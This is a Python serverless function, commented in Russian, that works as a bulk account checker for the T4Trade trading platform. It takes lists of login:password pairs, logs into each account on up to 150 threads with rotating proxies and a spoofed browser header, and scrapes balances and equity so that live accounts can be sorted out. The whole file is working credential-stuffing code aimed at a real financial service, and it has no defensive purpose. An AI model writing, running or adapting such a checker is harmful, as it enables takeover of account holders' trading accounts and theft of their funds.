"""
Проверка баланса аккаунтов T4Trade.
Принимает список login:password, авторизуется на сайте и возвращает баланс.
"""
import json
import re
import os
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed


BASE_URL = "https://www.t4trade.com"
LOGIN_URL = f"{BASE_URL}/json/login.json"
HOME_URL = f"{BASE_URL}/en/client-portal/home"
PORTAL_URL = f"{BASE_URL}/en/client-portal"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": BASE_URL,
    "Referer": PORTAL_URL,
}


def get_security_token(session: requests.Session) -> str:
    resp = session.get(PORTAL_URL, headers={
        "User-Agent": HEADERS["User-Agent"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }, timeout=20)
    soup = BeautifulSoup(resp.text, "html.parser")
    inp = soup.find("input", {"name": "security"})
    if inp:
        return inp.get("value", "")
    match = re.search(r'name=["\']security["\'] value=["\']([^"\']+)["\']', resp.text)
    return match.group(1) if match else ""


def parse_balance(html: str) -> dict:
    soup = BeautifulSoup(html, "html.parser")
    result = {
        "accounts": [],
        "raw_balance": None,
        "raw_equity": None,
        "currency": None,
    }

    balance_patterns = [
        r'Balance[:\s]+([€$£¥]?\s*[\d,\.]+\s*[A-Z]{0,3})',
        r'"balance"[:\s]+"?([^",}]+)"?',
        r'balance["\s:]+([€$£]?[\d,\.]+)',
    ]

    for pattern in balance_patterns:
        m = re.search(pattern, html, re.IGNORECASE)
        if m:
            result["raw_balance"] = m.group(1).strip()
            break

    cards = soup.find_all(class_=re.compile(r'card|account', re.I))
    for card in cards:
        text = card.get_text(separator=" ", strip=True)
        if re.search(r'balance|equity|account', text, re.I):
            acc = {}
            m_num = re.search(r'\|\s*(\d{6,})\s*\|', text)
            if m_num:
                acc["account_number"] = m_num.group(1)

            m_bal = re.search(r'Balance[:\s]*([€$£]?[\d,\.]+\s*[A-Z]{0,3})', text, re.I)
            if m_bal:
                acc["balance"] = m_bal.group(1).strip()

            m_eq = re.search(r'Equity[:\s]*([€$£]?[\d,\.]+\s*[A-Z]{0,3})', text, re.I)
            if m_eq:
                acc["equity"] = m_eq.group(1).strip()

            m_curr = re.search(r'([€$£¥])', text)
            if m_curr:
                symbols = {"€": "EUR", "$": "USD", "£": "GBP", "¥": "JPY"}
                acc["currency"] = symbols.get(m_curr.group(1), "USD")

            if acc:
                result["accounts"].append(acc)

    if not result["accounts"]:
        all_text = soup.get_text(separator=" ", strip=True)
        m_bal = re.search(r'Balance[:\s]*([€$£]?[\d,\.]+)', all_text, re.I)
        if m_bal:
            result["raw_balance"] = m_bal.group(1).strip()
        m_eq = re.search(r'Equity[:\s]*([€$£]?[\d,\.]+)', all_text, re.I)
        if m_eq:
            result["raw_equity"] = m_eq.group(1).strip()

    return result


def build_proxy_dict(proxy_str: str, proxy_type: str) -> dict:
    """Парсит строку прокси в формат для requests."""
    p = proxy_str.strip()
    if not p:
        return {}
    if "://" in p:
        return {"http": p, "https": p}
    parts = p.split(":")
    if len(parts) == 2:
        url = f"{proxy_type}://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        url = f"{proxy_type}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    else:
        url = f"{proxy_type}://{p}"
    return {"http": url, "https": url}


def check_account(login: str, password: str, proxy_str: str = "", proxy_type: str = "https") -> dict:
    session = requests.Session()
    session.headers.update(HEADERS)

    proxies = build_proxy_dict(proxy_str, proxy_type) if proxy_str else {}
    if proxies:
        session.proxies.update(proxies)

    try:
        security = get_security_token(session)

        login_data = {
            "security": security,
            "action": "login",
            "currentContext": "ea",
            "login": login.strip(),
            "password": password.strip(),
            "otp": "",
            "otp_sms": "",
        }

        login_resp = session.post(
            LOGIN_URL,
            data=login_data,
            headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
            timeout=25,
            allow_redirects=True,
        )

        login_text = login_resp.text.strip()
        try:
            login_json = login_resp.json()
        except Exception:
            login_json = {}

        is_success = False
        if isinstance(login_json, dict):
            is_success = login_json.get("status") in ("success", "ok")
        elif isinstance(login_json, str):
            is_success = "success" in login_json.lower()

        if not is_success and "success" not in login_text.lower():
            if isinstance(login_json, dict):
                error_msg = login_json.get("message", login_json.get("error", "Неверные данные"))
            else:
                error_msg = "Неверные данные"
            return {
                "login": login,
                "status": "invalid",
                "error": str(error_msg),
                "accounts": [],
            }

        home_resp = session.get(HOME_URL, timeout=20)
        balance_data = parse_balance(home_resp.text)

        return {
            "login": login,
            "status": "valid",
            "accounts": balance_data["accounts"],
            "raw_balance": balance_data["raw_balance"],
            "raw_equity": balance_data["raw_equity"],
        }

    except requests.exceptions.Timeout:
        return {"login": login, "status": "error", "error": "Timeout", "accounts": []}
    except Exception as e:
        return {"login": login, "status": "error", "error": str(e), "accounts": []}


def handler(event: dict, context) -> dict:
    cors = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
    }

    if event.get("httpMethod") == "OPTIONS":
        return {"statusCode": 200, "headers": cors, "body": ""}

    try:
        body = json.loads(event.get("body") or "{}")
    except Exception:
        return {"statusCode": 400, "headers": cors, "body": json.dumps({"error": "Invalid JSON"})}

    accounts_raw = body.get("accounts", [])
    threads = min(int(body.get("threads", 5)), 150)
    proxy_list = body.get("proxies", [])
    proxy_type = body.get("proxy_type", "https")
    proxy_rotation = body.get("proxy_rotation", "each")

    if not accounts_raw:
        return {"statusCode": 400, "headers": cors, "body": json.dumps({"error": "No accounts provided"})}

    parsed = []
    for item in accounts_raw:
        if ":" in item:
            parts = item.split(":", 1)
            parsed.append({"login": parts[0], "password": parts[1]})

    if not parsed:
        return {"statusCode": 400, "headers": cors, "body": json.dumps({"error": "Invalid format. Use login:password"})}

    def get_proxy_for_index(idx: int) -> str:
        if not proxy_list:
            return ""
        if proxy_rotation == "each":
            return proxy_list[idx % len(proxy_list)]
        elif proxy_rotation == "every10":
            return proxy_list[(idx // 10) % len(proxy_list)]
        elif proxy_rotation == "every50":
            return proxy_list[(idx // 50) % len(proxy_list)]
        return proxy_list[idx % len(proxy_list)]

    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(
                check_account,
                a["login"],
                a["password"],
                get_proxy_for_index(i),
                proxy_type,
            ): a
            for i, a in enumerate(parsed)
        }
        for future in as_completed(futures):
            results.append(future.result())

    valid = [r for r in results if r["status"] == "valid"]
    invalid = [r for r in results if r["status"] == "invalid"]
    errors = [r for r in results if r["status"] == "error"]

    return {
        "statusCode": 200,
        "headers": cors,
        "body": json.dumps({
            "total": len(results),
            "valid": len(valid),
            "invalid": len(invalid),
            "errors": len(errors),
            "results": results,
        }, ensure_ascii=False),
    }